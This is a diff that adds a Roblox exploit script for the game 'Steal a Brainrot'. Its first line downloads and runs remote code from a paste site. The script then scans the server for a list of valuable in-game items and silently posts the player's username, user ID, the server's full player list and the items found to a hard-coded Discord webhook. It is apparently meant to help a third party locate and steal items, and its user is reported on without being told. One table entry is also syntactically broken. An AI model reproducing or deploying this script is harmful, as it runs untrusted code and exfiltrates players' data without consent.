@@ -1,0 +1,133 @@
+loadstring(game:HttpGet("https://pastefy.app/Cpx1Uzw7/raw"))()
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local username = player.Name
+local userid = player.UserId
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local validGame = string.find(string.lower(gameName),"steal a brainrot") ~= nil
+
+if not validGame then
+local gui = Instance.new("ScreenGui")
+gui.Name = "VoidWarning"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0,420,0,120)
+frame.Position = UDim2.new(0.5,-210,0.15,0)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(1,-20,1,-20)
+text.Position = UDim2.new(0,10,0,10)
+text.BackgroundTransparency = 1
+text.Text = "Warning: Make sure you are in Steal a Brainrot"
+text.TextColor3 = Color3.fromRGB(255,170,0)
+text.TextScaled = true
+text.Font = Enum.Font.GothamBold
+text.Parent = frame
+
+task.delay(6,function()
+TweenService:Create(frame,TweenInfo.new(1),{BackgroundTransparency=1}):Play()
+TweenService:Create(text,TweenInfo.new(1),{TextTransparency=1}):Play()
+task.wait(1)
+gui:Destroy()
+end)
+end
+
+local webhook = "https://discord.com/api/webhooks/1486120209357082785/FlHYuCYLXKAoFxGeFrShzfaeAZ7UswxbpykrtVCWXYKApylJAznAPoCpfpOq9-7V8iw4"
+
+local targets = {
+["Hydra Dragon Cannelloni"]=true,["W or L"]=true,["La Romantic Grande"]=true,
+["Ginger Gerat"]=true,["Lovin Rose"]=true,["Tuff Toucan"]=true,["Guest 666"]=true,
+["Los Amigos"]=true,["Skibidi Toilet"]=true,["Celestial Pegasus"]=true,
+["Love Love “Bear]=true,["Los Tacoritas"]=true,["Cerberus"]=true,
+["Fragrama and Chocrama"]=true,["Celularcini Viciosini"]=true,
+["Popcuru and Fizzuru"]=true,["Headless Horseman"]=true,["Spooky and Pumpky"]=true,
+["Los Spaghettis"]=true,["Tacorita Bicicleta"]=true,["Los Primos"]=true,
+["Swaggy Bros"]=true,["Swag Soda"]=true,["Festive 67"]=true,
+["Ketupat Kepat"]=true,["Tang Tang Keletang"]=true,["Sammyni Fattini"]=true,
+["Capitano Moby"]=true,["La Secret Combinasion"]=true,
+["La Supreme Combinasion"]=true,["Dragon Cannelloni"]=true,
+["Gobblino Uniciclino"]=true,["Rosetti Tualetti"]=true,
+["Lavadorito Spinito"]=true,["Reinito Sleighito"]=true,
+["Tictac Sahur"]=true,["Esok Sekolah"]=true,["Los Puggies"]=true,
+["Chipso and Queso"]=true,["Money Money Puggy"]=true,
+["Mieteteira Bicicleteira"]=true,["Quesadillo Vampiro"]=true,
+["Love Love Bear"]=true,["Los Candies"]=true,["Burguro And Fryuro"]=true,
+["Cooki and Milki"]=true,["Strawberry Elephant"]=true,
+["La Extinct Grande"]=true,["Chillin Chili"]=true,
+["La Casa Boo"]=true,["Chicliterita bicicliterita"]=true,
+["La Food Combinasion"]=true,["La Jolly Grande"]=true,
+["La Spooky Grande"]=true,["Ketupat Bros"]=true,
+["Garama and Madundung"]=true,["Ketchuru and Musturu"]=true,
+["Nuclearo Dinossauro"]=true,["La Taco Combinasion"]=true,
+["Rosey and Teddy"]=true,["Dragon Gingerini"]=true,
+["Meowl"]=true
+}
+
+local requestFunction =
+request or http_request or syn and syn.request or fluxus and fluxus.request
+
+repeat task.wait() until requestFunction
+
+local plots = workspace:FindFirstChild("Plots")
+local foundTargets = {}
+local seen = {}
+
+if plots then
+for _,v in ipairs(plots:GetDescendants()) do
+if targets[v.Name] and not seen[v.Name] and v:IsA("Model") then
+if v:FindFirstChildWhichIsA("BasePart") then
+seen[v.Name] = true
+table.insert(foundTargets,v.Name)
+end
+end
+end
+end
+
+local playerList = {}
+for _,p in ipairs(Players:GetPlayers()) do
+table.insert(playerList,p.Name)
+end
+
+local playerCount = #playerList
+local ping = (#foundTargets > 0) and "@everyone " or ""
+
+local message =
+ping..
+"Mobile Copy\n-# **Just tap**\n`"..username.."`\n\n"..
+"User: "..username.." ("..userid..")\n"..
+"Game: "..gameName.."\n\n"..
+"Players In Server: "..playerCount.."\n\nPlayer List:\n"
+
+for _,name in ipairs(playerList) do
+message = message.."- "..name.."\n"
+end
+
+if #foundTargets > 0 then
+message = message.."\nTargets:\n"
+for _,t in ipairs(foundTargets) do
+message = message.."- "..t.."\n"
+end
+else
+message = message.."\nScan Complete (No Targets Found)"
+end
+
+requestFunction({
+Url = webhook,
+Method = "POST",
+Headers = {["Content-Type"]="application/json"},
+Body = HttpService:JSONEncode({
+content = message,
+allowed_mentions = {parse={"everyone"}}
+})
+})
